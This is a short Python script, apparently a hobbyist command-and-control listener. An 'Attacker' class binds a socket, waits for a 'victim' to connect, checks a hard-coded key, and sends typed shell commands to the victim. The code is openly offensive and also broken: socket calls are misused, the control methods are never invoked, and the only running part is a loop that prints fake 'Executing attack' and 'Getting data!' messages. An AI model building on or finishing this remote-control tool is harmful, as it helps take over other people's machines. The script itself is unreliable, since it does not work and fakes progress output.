#!usr/bin/python
# -*- coding: utf-8 -*-

import socket
import sys, time

class Attacker(object):

    def __init__(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.host = "192.168.1.3"
        self.port = 6890
        self.key = "pldk99-SX-.#alm.-$#!ffrs.??¡"

    def main(self):
        self.server.bind((self.host, self.port))
        self.server.listen(1)
        print("[INFO] Establishing the connection . . . ")
        while True:
            victim = self.server.accept()
            direction = self.server.accept()
            print("[INFO] The connection has been established with {0}".format(direction[0]))
            open_door = self.autentication(victim)
            if open_door == "correct access":
                pass
    
    def autentication(self, victim):
        petition = victim.recv(4096)
        if petition == self.key:
            return "correct access"
    
    def cmdControlVictim(self, victim):
        while True:
            try:
                cmd = input("\033[1;31m>> \033[0;m")
                victim.send(cmd)
                output = victim.recv(4096)
                return output
            except KeyboardInterrupt:
                sys.exit(1)
car = ""
while True:
    time.sleep(2)
    car += ". "
    print("Executing attack " + car)
    time.sleep(1)
    print("[ ** ]Getting data! " + car)